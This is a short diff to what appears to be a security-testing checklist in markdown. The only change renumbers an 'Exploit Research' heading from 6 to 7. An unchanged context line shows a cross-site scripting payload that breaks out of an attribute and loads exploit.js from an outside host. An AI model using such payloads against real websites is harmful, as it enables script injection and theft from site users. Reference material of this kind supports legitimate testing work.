@@ -108,7 +108,7 @@ CTRL + U
 "><script src=//www.example.com/exploit.js></script>
 ```
 
-#6. - Exploit Research
+#7. - Exploit Research
 -----------------------------------------
 
 - CVEdetails
